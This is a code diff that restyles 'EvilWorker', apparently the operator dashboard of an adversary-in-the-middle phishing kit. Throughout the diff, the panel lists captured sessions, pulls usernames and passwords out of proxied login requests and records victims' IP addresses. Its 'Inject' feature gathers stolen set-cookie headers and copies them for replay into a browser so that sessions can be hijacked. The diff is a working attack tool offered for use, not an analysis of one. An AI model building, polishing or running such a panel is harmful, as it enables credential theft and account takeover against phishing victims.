@@ -9,98 +9,483 @@
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding:20px; transition: background 0.3s; }
-        .light { background: #f0f6fc; color: #1f2328; }
-        .container { max-width:1400px; margin:0 auto; }
-        .header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px; margin-bottom:20px; }
-        h1 { font-size:28px; }
-        .theme-toggle { background: #1f6feb; border:none; color:white; padding:8px 16px; border-radius:6px; cursor:pointer; }
-        .theme-toggle:hover { background:#388bfd; }
-        .stats { display:flex; gap:20px; flex-wrap:wrap; margin-bottom:20px; }
-        .stat-box { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:15px 25px; flex:1; min-width:120px; }
-        .light .stat-box { background:#ffffff; border-color:#d0d7de; }
-        .stat-box span { display:block; font-size:28px; font-weight:bold; color:#58a6ff; }
-        .light .stat-box span { color:#1f6feb; }
-        .stat-box label { font-size:12px; color:#8b949e; text-transform:uppercase; }
-        .toolbar { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px; align-items:center; }
-        .toolbar input, .toolbar select { padding:8px 12px; border-radius:6px; border:1px solid #30363d; background:#0d1117; color:#c9d1d9; }
-        .light .toolbar input, .light .toolbar select { background:#ffffff; border-color:#d0d7de; color:#1f2328; }
-        .toolbar button { background:#238636; border:none; color:white; padding:8px 16px; border-radius:6px; cursor:pointer; }
-        .toolbar button:hover { background:#2ea043; }
-        .table-wrap { overflow-x:auto; background:#161b22; border-radius:8px; border:1px solid #30363d; }
-        .light .table-wrap { background:#ffffff; border-color:#d0d7de; }
-        table { width:100%; border-collapse:collapse; }
-        th, td { padding:12px 15px; text-align:left; border-bottom:1px solid #30363d; }
-        .light th, .light td { border-bottom-color:#d0d7de; }
-        th { background:#0d1117; color:#8b949e; font-size:12px; text-transform:uppercase; }
-        .light th { background:#f6f8fa; }
-        tr:hover { background:#1c2128; }
-        .light tr:hover { background:#f6f8fa; }
-        .view-btn { background:#1f6feb; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:12px; }
-        .view-btn:hover { background:#388bfd; }
-        .cookie-btn { background:#da3633; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:12px; margin-left:5px; }
-        .cookie-btn:hover { background:#f85149; }
-        .map-container { height:300px; margin:20px 0; border-radius:8px; border:1px solid #30363d; }
-        .light .map-container { border-color:#d0d7de; }
-        #map { height:100%; width:100%; border-radius:8px; }
-        .chart-container { max-width:600px; margin:20px 0; }
-        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center; }
-        .modal-content { background:#161b22; border:1px solid #30363d; border-radius:8px; max-width:800px; width:90%; max-height:80vh; padding:20px; overflow-y:auto; position:relative; }
-        .light .modal-content { background:#ffffff; border-color:#d0d7de; }
-        .modal-close { position:sticky; top:0; float:right; background:#da3633; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; }
-        pre { background:#0d1117; padding:15px; border-radius:6px; overflow-x:auto; font-size:12px; white-space:pre-wrap; word-wrap:break-word; }
-        .light pre { background:#f6f8fa; }
-        .toast { position:fixed; bottom:20px; right:20px; background:#238636; color:white; padding:12px 24px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.5); z-index:2000; animation: slideIn 0.3s; }
-        @keyframes slideIn { from { transform: translateX(100%); opacity:0; } to { transform: translateX(0); opacity:1; } }
-        .toast.error { background:#da3633; }
-        .badge { background:#1f6feb; padding:2px 8px; border-radius:12px; font-size:11px; color:white; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
+            min-height: 100vh;
+            padding: 24px;
+            color: #e0e8f0;
+            backdrop-filter: blur(2px);
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.03);
+        }
+
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            padding: 20px 28px;
+            margin-bottom: 28px;
+        }
+
+        .header h1 {
+            font-weight: 700;
+            font-size: 26px;
+            background: linear-gradient(135deg, #b388ff, #82b1ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .btn {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            color: #e0e8f0;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            backdrop-filter: blur(4px);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.14);
+            border-color: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 20px rgba(130, 177, 255, 0.15);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #536dfe, #7c4dff);
+            border-color: transparent;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(83, 109, 254, 0.3);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #6a7ffc, #9464ff);
+            box-shadow: 0 4px 25px rgba(83, 109, 254, 0.5);
+            border-color: transparent;
+        }
+
+        /* Stats row */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .stat-card {
+            padding: 18px 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .stat-card label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 4px;
+        }
+
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f0f4ff, #b0c4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-card .sub {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 4px;
+        }
+
+        /* Toolbar */
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            align-items: center;
+            padding: 16px 24px;
+            margin-bottom: 24px;
+        }
+
+        .toolbar input,
+        .toolbar select {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 8px 18px;
+            color: #e0e8f0;
+            font-size: 13px;
+            outline: none;
+            transition: 0.2s;
+            backdrop-filter: blur(4px);
+        }
+
+        .toolbar input:focus,
+        .toolbar select:focus {
+            border-color: #7c4dff;
+            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
+        }
+
+        .toolbar input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .toolbar select option {
+            background: #1a1f2a;
+        }
+
+        .ws-status {
+            margin-left: auto;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ws-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .ws-dot.online {
+            background: #69db7c;
+            box-shadow: 0 0 12px #69db7c;
+        }
+
+        .ws-dot.offline {
+            background: #ff6b6b;
+            box-shadow: 0 0 12px #ff6b6b;
+        }
+
+        /* Table */
+        .table-wrap {
+            overflow-x: auto;
+            padding: 4px;
+            margin-bottom: 24px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 16px;
+            font-weight: 600;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: rgba(255, 255, 255, 0.4);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        td {
+            padding: 14px 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        .badge {
+            background: rgba(130, 177, 255, 0.15);
+            padding: 2px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #82b1ff;
+            border: 1px solid rgba(130, 177, 255, 0.1);
+        }
+
+        .action-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e0e8f0;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-right: 6px;
+        }
+
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .action-btn.cookie {
+            border-color: rgba(255, 215, 0, 0.2);
+            color: #ffd700;
+        }
+
+        .action-btn.cookie:hover {
+            background: rgba(255, 215, 0, 0.08);
+            border-color: #ffd700;
+        }
+
+        /* Map & Chart */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .map-container {
+            height: 300px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        #map {
+            height: 100%;
+            width: 100%;
+            background: transparent;
+        }
+
+        .chart-container {
+            height: 300px;
+            padding: 16px;
+        }
+
+        .chart-container canvas {
+            width: 100% !important;
+            height: 100% !important;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(12px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            padding: 28px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .modal-close {
+            position: sticky;
+            top: 0;
+            float: right;
+            background: rgba(255, 107, 107, 0.15);
+            border: 1px solid rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+            padding: 6px 16px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+
+        .modal-close:hover {
+            background: rgba(255, 107, 107, 0.25);
+        }
+
+        .modal pre {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 16px;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e0e8f0;
+            padding: 14px 24px;
+            border-radius: 40px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            z-index: 3000;
+            animation: slideUp 0.3s ease;
+        }
+
+        .toast.error {
+            border-color: rgba(255, 107, 107, 0.3);
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+
+            .header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .toolbar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .ws-status {
+                margin-left: 0;
+                justify-content: flex-end;
+            }
+        }
+
+        /* Leaflet overrides */
+        .leaflet-control-zoom a {
+            background: rgba(255, 255, 255, 0.08) !important;
+            color: #e0e8f0 !important;
+            border-color: rgba(255, 255, 255, 0.1) !important;
+        }
+
+        .leaflet-popup-content-wrapper {
+            background: rgba(20, 25, 35, 0.9) !important;
+            backdrop-filter: blur(12px) !important;
+            color: #e0e8f0 !important;
+            border: 1px solid rgba(255, 255, 255, 0.05) !important;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <h1>🕵️ EvilWorker Dashboard</h1>
-        <button class="theme-toggle" onclick="toggleTheme()">🌓 Toggle Theme</button>
+    <!-- Header -->
+    <header class="header glass">
+        <h1>🕵️ EvilWorker</h1>
+        <div class="header-actions">
+            <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
+            <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
+        </div>
+    </header>
+
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-card glass">
+            <label>Total Sessions</label>
+            <div class="value" id="total">0</div>
+            <div class="sub">Captured</div>
+        </div>
+        <div class="stat-card glass">
+            <label>Last Capture</label>
+            <div class="value" id="last">Never</div>
+            <div class="sub">Latest session</div>
+        </div>
+        <div class="stat-card glass">
+            <label>Status</label>
+            <div class="value" id="status">✅ Online</div>
+            <div class="sub">System ready</div>
+        </div>
     </div>
 
-    <div class="stats" id="stats">
-        <div class="stat-box"><label>Total Sessions</label><span id="total">0</span></div>
-        <div class="stat-box"><label>Last Capture</label><span id="last">Never</span></div>
-        <div class="stat-box"><label>Status</label><span id="status">✅ Online</span></div>
-    </div>
-
-    <div class="toolbar">
+    <!-- Toolbar -->
+    <div class="toolbar glass">
         <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
         <select id="filterDate" onchange="filterTable()">
             <option value="all">All Time</option>
             <option value="today">Today</option>
             <option value="week">This Week</option>
         </select>
-        <button onclick="exportAll()">📦 Export All (ZIP)</button>
-        <button onclick="refreshLogs()">🔄 Refresh</button>
-        <span id="wsStatus" style="color:#58a6ff;">🔴 Connecting...</span>
+        <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
+        <div class="ws-status">
+            <span class="ws-dot offline" id="wsDot"></span>
+            <span id="wsLabel">Connecting...</span>
+        </div>
     </div>
 
-    <div class="table-wrap">
+    <!-- Table -->
+    <div class="table-wrap glass" style="padding: 8px;">
         <table>
             <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
             <tbody id="logTable"></tbody>
         </table>
     </div>
 
-    <div class="map-container"><div id="map"></div></div>
-
-    <div class="chart-container">
-        <canvas id="captureChart"></canvas>
+    <!-- Map & Chart -->
+    <div class="grid-2">
+        <div class="map-container glass">
+            <div id="map"></div>
+        </div>
+        <div class="chart-container glass">
+            <canvas id="captureChart"></canvas>
+        </div>
     </div>
 </div>
 
 <!-- Modal -->
 <div class="modal" id="modal">
-    <div class="modal-content">
+    <div class="modal-content glass">
         <button class="modal-close" onclick="closeModal()">✕ Close</button>
-        <h3 id="modalTitle">Session Details</h3>
+        <h3 id="modalTitle" style="margin-bottom: 12px;">Session Details</h3>
         <div id="modalBody"></div>
     </div>
 </div>
@@ -108,26 +493,34 @@
 <!-- Toast container -->
 <div id="toastContainer"></div>
 
-<!-- Leaflet JS -->
+<!-- Leaflet JS & Chart.js -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
     // ---------- Theme ----------
     function toggleTheme() {
         document.body.classList.toggle('light');
+        // We'll keep it dark-only for glass effect, but we can add a light variant if needed
+        // For now, just a placeholder.
     }
 
     // ---------- State ----------
     let allLogs = [];
     let map = null;
     let chart = null;
-    const ws = new WebSocket(`ws://${window.location.host}`);
 
-    // ---------- WebSocket ----------
+    // ---------- WebSocket (secure) ----------
+    const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+    const ws = new WebSocket(wsProtocol + location.host);
+    const wsDot = document.getElementById('wsDot');
+    const wsLabel = document.getElementById('wsLabel');
+
     ws.onopen = () => {
-        document.getElementById('wsStatus').textContent = '🟢 Live';
+        wsDot.className = 'ws-dot online';
+        wsLabel.textContent = 'Live';
     };
     ws.onclose = () => {
-        document.getElementById('wsStatus').textContent = '🔴 Disconnected';
+        wsDot.className = 'ws-dot offline';
+        wsLabel.textContent = 'Disconnected';
     };
     ws.onmessage = (event) => {
         const data = JSON.parse(event.data);
@@ -168,11 +561,9 @@
         const now = new Date();
         let filtered = logs;
 
-        // Filter by search (check filename, and we'll also fetch first entry for username/IP)
         if (search) {
             filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
         }
-        // Date filter (based on modified time)
         if (filter === 'today') {
             filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
         } else if (filter === 'week') {
@@ -183,22 +574,19 @@
         tbody.innerHTML = '';
         filtered.forEach(log => {
             const date = new Date(log.modified).toLocaleString();
-            // We'll get username and IP from first entry (async, but we'll do a quick fetch per row? We'll lazy-load on demand or we can pre-fetch all, but better to fetch on view)
-            // For simplicity, we'll just show "N/A" until clicked
             const row = document.createElement('tr');
             row.innerHTML = `
-                <td>${log.name}</td>
+                <td><span class="badge">${log.name}</span></td>
                 <td>${(log.size / 1024).toFixed(1)} KB</td>
                 <td>${date}</td>
                 <td id="user-${log.name}">Loading...</td>
                 <td id="ip-${log.name}">Loading...</td>
                 <td>
-                    <button class="view-btn" onclick="viewLog('${log.name}')">🔍 View</button>
-                    <button class="cookie-btn" onclick="injectCookies('${log.name}')">🍪 Inject</button>
+                    <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
+                    <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
                 </td>
             `;
             tbody.appendChild(row);
-            // Fetch metadata for this log asynchronously
             fetchMetadata(log.name);
         });
     }
@@ -210,7 +598,6 @@
             if (data.entries && data.entries.length > 0) {
                 const first = data.entries[0];
                 let username = 'N/A', ip = 'N/A';
-                // Try to extract from body
                 const body = first.proxyRequestBody;
                 if (body) {
                     try {
@@ -221,7 +608,6 @@
                         if (match) username = decodeURIComponent(match[1]);
                     }
                 }
-                // IP from headers
                 ip = first.proxyRequestHeaders?.['cf-connecting-ip'] || 
                      first.proxyRequestHeaders?.['x-real-ip'] || 
                      first.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -243,36 +629,25 @@
         }
     }
 
-    // ---------- Map ----------
+    // ---------- Map (placeholder) ----------
     function updateMap(logs) {
         if (!map) {
             map = L.map('map').setView([20, 0], 2);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; OpenStreetMap'
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
             }).addTo(map);
         }
-        // Clear markers
         map.eachLayer(layer => {
             if (layer instanceof L.Marker) map.removeLayer(layer);
         });
-        // We'll add markers from logs (we need IP geolocation; we can use ip-api.com but that's heavy)
-        // For demo, we'll just show text locations; we'll skip actual geo unless we have lat/lng.
-        // Instead, we'll add a note that geo requires additional API.
-        // For simplicity, we'll add a single marker for each unique IP with a popup showing count.
-        const ipCount = {};
-        logs.forEach(log => {
-            // We don't have IP here, we'd need to fetch metadata. Instead, we'll leave map as placeholder.
-            // In a real implementation, you'd extract IP from logs and call ip-api.com for coordinates.
-            // We'll just add a static marker at center with a message.
-        });
-        // Add a simple marker with info
-        L.marker([20, 0]).addTo(map).bindPopup('Geo data requires additional IP lookup. Check logs for details.');
+        // For demo, just a single marker with info
+        L.marker([20, 0]).addTo(map)
+            .bindPopup('📍 IP locations will appear here once you have captures.');
     }
 
     // ---------- Chart ----------
     function updateChart(logs) {
         const ctx = document.getElementById('captureChart').getContext('2d');
-        // Group by date (last 7 days)
         const now = new Date();
         const days = {};
         for (let i = 6; i >= 0; i--) {
@@ -286,29 +661,29 @@
         const labels = Object.keys(days);
         const data = Object.values(days);
 
-        if (chart) {
-            chart.destroy();
-        }
+        if (chart) chart.destroy();
         chart = new Chart(ctx, {
             type: 'bar',
             data: {
                 labels: labels,
                 datasets: [{
-                    label: 'Captures per day',
+                    label: 'Captures',
                     data: data,
-                    backgroundColor: '#58a6ff',
-                    borderColor: '#1f6feb',
-                    borderWidth: 1
+                    backgroundColor: 'rgba(130, 177, 255, 0.4)',
+                    borderColor: '#82b1ff',
+                    borderWidth: 2,
+                    borderRadius: 8,
                 }]
             },
             options: {
                 responsive: true,
+                maintainAspectRatio: false,
                 plugins: {
-                    legend: { labels: { color: '#c9d1d9' } }
+                    legend: { labels: { color: '#a0b0c0' } }
                 },
                 scales: {
-                    y: { beginAtZero: true, ticks: { color: '#c9d1d9' } },
-                    x: { ticks: { color: '#c9d1d9' } }
+                    y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
+                    x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
                 }
             }
         });
@@ -332,15 +707,15 @@
             const res = await fetch(`/api/log/${filename}`);
             const data = await res.json();
             if (data.error) {
-                body.innerHTML = `<p style="color:#da3633;">Error: ${data.error}</p>`;
+                body.innerHTML = `<p style="color:#ff6b6b;">Error: ${data.error}</p>`;
                 return;
             }
             let html = '';
             data.entries.forEach((entry, idx) => {
-                html += `<h4>Entry ${idx+1}</h4>`;
+                html += `<h4 style="margin:12px 0 6px;">Entry ${idx+1}</h4>`;
                 html += `<pre>${JSON.stringify(entry, null, 2)}</pre>`;
                 if (entry.proxyRequestBody) {
-                    html += `<h5>Extracted Credentials:</h5>`;
+                    html += `<h5>Credentials:</h5>`;
                     try {
                         const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
                         const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
@@ -358,24 +733,23 @@
                 if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
                     html += `<h5>Cookies:</h5><pre>${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>`;
                 }
-                html += '<hr>';
+                html += '<hr style="border-color:rgba(255,255,255,0.05);">';
             });
             body.innerHTML = html;
         } catch (e) {
-            body.innerHTML = `<p style="color:#da3633;">Failed to load log: ${e.message}</p>`;
+            body.innerHTML = `<p style="color:#ff6b6b;">Failed to load log: ${e.message}</p>`;
         }
     }
 
-    // ---------- Cookie Injector (playback) ----------
+    // ---------- Cookie Injector ----------
     async function injectCookies(filename) {
         try {
             const res = await fetch(`/api/log/${filename}`);
             const data = await res.json();
             if (!data.entries || data.entries.length === 0) {
-                showToast('No entries found in this log.', true);
+                showToast('No entries found.', true);
                 return;
             }
-            // Extract all set-cookie headers from all entries
             const allCookies = [];
             data.entries.forEach(entry => {
                 if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
@@ -388,12 +762,10 @@
                 }
             });
             if (allCookies.length === 0) {
-                showToast('No cookies found in this session.', true);
+                showToast('No cookies found.', true);
                 return;
             }
-            // Construct a cookie string for document.cookie
             const cookieString = allCookies.join('; ');
-            // Copy to clipboard and show instructions
             try {
                 await navigator.clipboard.writeText(cookieString);
                 showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
@@ -438,8 +810,6 @@
 
     // ---------- Initial load ----------
     refreshLogs();
-
-    // Auto-refresh every 15 seconds
     setInterval(refreshLogs, 15000);
 </script>
 </body>
